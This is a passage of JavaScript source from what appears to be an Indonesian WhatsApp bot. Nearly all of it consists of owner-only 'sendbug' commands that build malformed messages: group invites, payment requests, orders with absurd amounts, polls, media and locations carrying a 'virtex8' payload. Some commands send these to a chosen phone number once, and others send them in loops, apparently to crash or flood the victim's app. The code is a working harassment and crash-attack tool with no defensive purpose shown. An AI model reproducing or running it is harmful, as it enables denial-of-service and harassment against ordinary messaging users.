atak.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
atak.relayMessage(from, order.message, { messageId: order.key.id })
atak.relayMessage(from, audio.message, { messageId: audio.key.id })
atak.relayMessage(from, image.message, { messageId: image.key.id })
atak.relayMessage(from, document.message, { messageId: document.key.id })
atak.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
atak.relayMessage(from, sticker.message, { messageId: sticker.key.id })
atak.sendButMessage(from, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendKatalog(from, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
break
case 'sendbuginvite':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
let buginvite = generateWAMessageFromContent(from ,{"groupInviteMessage": {"groupJid": "6283144394823@g.us","inviteCode": "UkJdqTXupAtmDwo4","inviteExpiration": "1643553084","invitetime": "1643293887000","groupName": virtex8,"thumbnail": ofrply,"caption": virtex8, "contextInfo": { "forwardingScore": 150, "isForwarded": true }}}, { quoted: setQuotedBug }) 
await setReply("Sending...")
atak.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id,})	
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugpayment':
case 'sendbugpay':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "100","noteMessage": {"extendedTextMessage": {"text": virtex8,}}}}), { userJid: from, quoted: setQuotedBug })
await setReply("Sending...")
atak.relayMessage(Input, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugpolling':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
var bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {"name": "HALO DEKK 🥶", "options": [{"optionName": "VOTE YUK"}, {"optionName": "BERANI VOTE GK"}, {"optionName": "VOTE LAH SEMUA"}, {"optionName": "KATANYA WA KEBAL"}, {"optionName": "SALAM CREATOR BOT"}], "selectableOptionsCount": 5 }}), { userJid: from, quoted: setQuotedBug })
await setReply("Sending...")
atak.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugtroli':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({"orderMessage": {"orderId": "594071395007984","orderImage": messa.imageMessage,"itemCount": 100000000000,"status": "INQUIRY","surface": "CATALOG","message": virtex8,"jpegThumbnail": ofrply,"orderTitle": virtex8,"sellerJid": "6287721317870@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000","totalCurrencyCode": "IDR",}}), { userJid: from, quoted: setQuotedBug })
await setReply("Sending...")
atak.relayMessage(Input, order.message, { messageId: order.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugaudio':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var audio = generateWAMessageFromContent(from, proto.Message.fromObject({"audioMessage": {"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc","mimetype": "audio/mpeg","fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=","fileLength": "258330","seconds": 16,"ptt": false,"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=","fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=","directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118","mediaKeyTimestamp": "1657190832",}}), { userJid: from, quoted: setQuotedBug })
await setReply("Sending...")
atak.relayMessage(Input, audio.message, { messageId: audio.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugimage': 
try{
if (!isRegist) return onlyRegist()
if (!isOwner) return onlyOwner()
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var image = generateWAMessageFromContent(from, proto.Message.fromObject({"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc","mimetype": "image/jpeg","caption": virtex8,"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=","fileLength": "42521","height": 426,"width": 640,"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=","fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=","directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1","mediaKeyTimestamp": "1657286523","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
await setReply("Sending...")
atak.relayMessage(Input, image.message, { messageId: image.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugdocument':
case 'sendbugdoc':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var document = generateWAMessageFromContent(from, proto.Message.fromObject({"documentMessage": {"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc","mimetype": "application/octet-stream","title": ".ridho","fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=","pageCount": 0,"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=","fileName": virtex8,"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=","directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5","mediaKeyTimestamp": "1657288637",}}), { userJid: from, quoted: setQuotedBug })
await setReply("Sending...")
atak.relayMessage(Input, document.message, { messageId: document.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'bugsticker':
case 'bugstick': 
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var sticker = generateWAMessageFromContent(from, proto.Message.fromObject({"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc","fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=","fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=","mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781","fileLength": "7774","mediaKeyTimestamp": "1657290167","isAnimated": false,}}), { userJid: from, quoted: setQuotedBug })
await setReply("Sending...")
atak.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'buglokasi': 
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({"liveLocationMessage": {"degreesLatitude": -6.9367014,"degreesLongitude": 107.7228574,"caption": virtex8,"sequenceNumber": "1657237469254001","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
await setReply("Sending...")
atak.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'bugkatalog':
case 'bugcatalog':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
await setReply("Sending...")
atak.sendKatalog(Input, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'bugbutton':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
const buttons = [
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv1}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv2}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv3}, type: 1}
]
await setReply("Sending...")
atak.sendButMessage(Input, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugspam':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
var bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var buginvite = generateWAMessageFromContent(from ,{"groupInviteMessage": {"groupJid": "6283144394823@g.us","inviteCode": "UkJdqTXupAtmDwo4","inviteExpiration": "1643553084","invitetime": "1643293887000","groupName": virtex8,"thumbnail": ofrply,"caption": virtex8, "contextInfo": { "forwardingScore": 150, "isForwarded": true }}}, { quoted: setQuotedBug }) 
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "100","noteMessage": {"extendedTextMessage": {"text": virtex8,}}}}), { userJid: from, quoted: setQuotedBug })
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {"name": "HALO DEKK 🥶", "options": [{"optionName": "VOTE YUK"}, {"optionName": "BERANI VOTE GK"}, {"optionName": "VOTE LAH SEMUA"}, {"optionName": "KATANYA WA KEBAL"}, {"optionName": "SALAM CREATOR BOT"}], "selectableOptionsCount": 5 }}), { userJid: from, quoted: setQuotedBug })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({"orderMessage": {"orderId": "594071395007984","orderImage": messa.imageMessage,"itemCount": 100000000000,"status": "INQUIRY","surface": "CATALOG","message": virtex8,"jpegThumbnail": ofrply,"orderTitle": virtex8,"sellerJid": "6287721317870@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000","totalCurrencyCode": "IDR",}}), { userJid: from, quoted: setQuotedBug })
var audio = generateWAMessageFromContent(from, proto.Message.fromObject({"audioMessage": {"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc","mimetype": "audio/mpeg","fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=","fileLength": "258330","seconds": 16,"ptt": false,"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=","fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=","directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118","mediaKeyTimestamp": "1657190832",}}), { userJid: from, quoted: setQuotedBug })
var image = generateWAMessageFromContent(from, proto.Message.fromObject({"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc","mimetype": "image/jpeg","caption": virtex8,"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=","fileLength": "42521","height": 426,"width": 640,"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=","fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=","directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1","mediaKeyTimestamp": "1657286523","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
var document = generateWAMessageFromContent(from, proto.Message.fromObject({"documentMessage": {"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc","mimetype": "application/octet-stream","title": ".ridho","fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=","pageCount": 0,"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=","fileName": virtex8,"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=","directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5","mediaKeyTimestamp": "1657288637",}}), { userJid: from, quoted: setQuotedBug })
var sticker = generateWAMessageFromContent(from, proto.Message.fromObject({"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc","fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=","fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=","mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781","fileLength": "7774","mediaKeyTimestamp": "1657290167","isAnimated": false,}}), { userJid: from, quoted: setQuotedBug })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({"liveLocationMessage": {"degreesLatitude": -6.9367014,"degreesLongitude": 107.7228574,"caption": virtex8,"sequenceNumber": "1657237469254001","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
const buttons = [
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv1}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv2}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv3}, type: 1}
]
atak.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id,})	
atak.relayMessage(Input, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
atak.relayMessage(Input, order.message, { messageId: order.key.id })
atak.relayMessage(Input, audio.message, { messageId: audio.key.id })
atak.relayMessage(Input, image.message, { messageId: image.key.id })
atak.relayMessage(Input, document.message, { messageId: document.key.id })
atak.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
atak.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
atak.sendButMessage(Input, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendKatalog(Input, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbuginvitev':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
let buginvite = generateWAMessageFromContent(from ,{"groupInviteMessage": {"groupJid": "6283144394823@g.us","inviteCode": "UkJdqTXupAtmDwo4","inviteExpiration": "1643553084","invitetime": "1643293887000","groupName": virtex8,"thumbnail": ofrply,"caption": virtex8, "contextInfo": { "forwardingScore": 150, "isForwarded": true }}}, { quoted: setQuotedBug }) 
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id,})	
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id,})	
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugpaymentv':
case 'sendbugpayv':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "100","noteMessage": {"extendedTextMessage": {"text": virtex8,}}}}), { userJid: from, quoted: setQuotedBug })
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugpollingv':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
var bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {"name": "HALO DEKK 🥶", "options": [{"optionName": "VOTE YUK"}, {"optionName": "BERANI VOTE GK"}, {"optionName": "VOTE LAH SEMUA"}, {"optionName": "KATANYA WA KEBAL"}, {"optionName": "SALAM CREATOR BOT"}], "selectableOptionsCount": 5 }}), { userJid: from, quoted: setQuotedBug })
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugtroliv':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({"orderMessage": {"orderId": "594071395007984","orderImage": messa.imageMessage,"itemCount": 100000000000,"status": "INQUIRY","surface": "CATALOG","message": virtex8,"jpegThumbnail": ofrply,"orderTitle": virtex8,"sellerJid": "6287721317870@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000","totalCurrencyCode": "IDR",}}), { userJid: from, quoted: setQuotedBug })
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, order.message, { messageId: order.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, order.message, { messageId: order.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugaudiov':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var audio = generateWAMessageFromContent(from, proto.Message.fromObject({"audioMessage": {"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc","mimetype": "audio/mpeg","fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=","fileLength": "258330","seconds": 16,"ptt": false,"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=","fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=","directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118","mediaKeyTimestamp": "1657190832",}}), { userJid: from, quoted: setQuotedBug })
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, audio.message, { messageId: audio.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, audio.message, { messageId: audio.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugimagev': 
try{
if (!isRegist) return onlyRegist()
if (!isOwner) return onlyOwner()
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
